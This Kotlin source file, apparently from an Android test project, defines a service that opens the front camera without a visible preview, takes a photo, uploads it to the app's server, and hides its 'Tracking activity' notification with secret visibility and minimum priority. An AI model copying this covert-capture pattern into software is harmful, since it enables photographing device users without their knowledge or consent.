package com.awetg.profiumtest.service

import android.app.IntentService
import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.hardware.Camera.CameraInfo
import android.util.Log
import androidx.core.app.NotificationCompat
import com.awetg.profiumtest.MainActivity
import com.awetg.profiumtest.R
import com.awetg.profiumtest.network.Api
import com.awetg.profiumtest.util.FileUtil
import okhttp3.*
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.ByteArrayInputStream
import java.io.File
import java.io.IOException
import java.lang.RuntimeException

@Suppress("DEPRECATION")
class CapturePhotoService : IntentService("CapturePhotoService") {

    override fun onHandleIntent(p0: Intent?) {}

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        startForeground(1212, createNotification("Tracking activity"))

        try {
            try {
                val cameraCount = Camera.getNumberOfCameras()
                val camera = if (cameraCount >= 2) Camera.open(CameraInfo.CAMERA_FACING_FRONT) else Camera.open()
                val surfaceTexture = SurfaceTexture(0)
                camera.setPreviewTexture(surfaceTexture)
                camera.startPreview()
                camera.takePicture(null, null, {data, camera ->
                    val file = FileUtil.getOrCreateProfileImageFile(applicationContext, "image/jpeg")
                    uploadFile(FileUtil.copyStreamToFile(ByteArrayInputStream(data), file))
                    if (camera != null) {
                        camera.stopPreview()
                        camera.release()
                        stopSelf()
                    }
                })
            } catch (e: RuntimeException) {
                e.printStackTrace()
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }

        return Service.START_STICKY
    }

    private fun createNotification(message: String): Notification {

        // pending intent to ope MainActivity when notification is clicked
        val pendingIntent = Intent(this, MainActivity::class.java).let {
            PendingIntent.getActivity(this, 0 , it, 0)
        }

        return NotificationCompat.Builder(this, "CHANNEL_ID")
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_launcher_background)
            .setContentIntent(pendingIntent)
            .setTicker(message)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Devices with API < 26 will respect visibility and priority
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun uploadFile(file: File) {
        val reqFile: RequestBody = RequestBody.create(MediaType.parse("image/*"), file)
        val body = MultipartBody.Part.createFormData("my_media", file.name, reqFile)
        val name = RequestBody.create(MediaType.parse("text/plain"), "my_media")

        val reqImageUpload = Api.service.uploadImage(body, name)
        reqImageUpload.enqueue(object : Callback<ResponseBody> {
            override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
                Log.d("DBG", "upload failed ${t.message}")
            }

            override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                Log.d("DBG", "uploaded ${response.raw()}")
            }

        })
    }
}
